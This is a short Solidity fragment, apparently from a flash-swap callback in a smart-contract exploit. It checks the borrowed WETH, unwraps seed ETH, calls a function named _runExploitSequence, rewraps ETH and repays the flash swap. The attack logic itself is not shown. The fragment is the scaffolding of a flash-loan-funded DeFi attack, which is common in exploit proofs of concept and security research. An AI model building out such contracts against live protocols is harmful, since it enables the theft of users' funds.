        require(borrowedWeth > 0, "unexpected amount");

        if (address(this).balance < CALL_SEED_ETH) {
            IWETH9(WETH).withdraw(CALL_SEED_ETH);
        }

        _runExploitSequence();
        _wrapAllEthToWeth();
        _repayFlashswap(msg.sender, borrowedWeth);


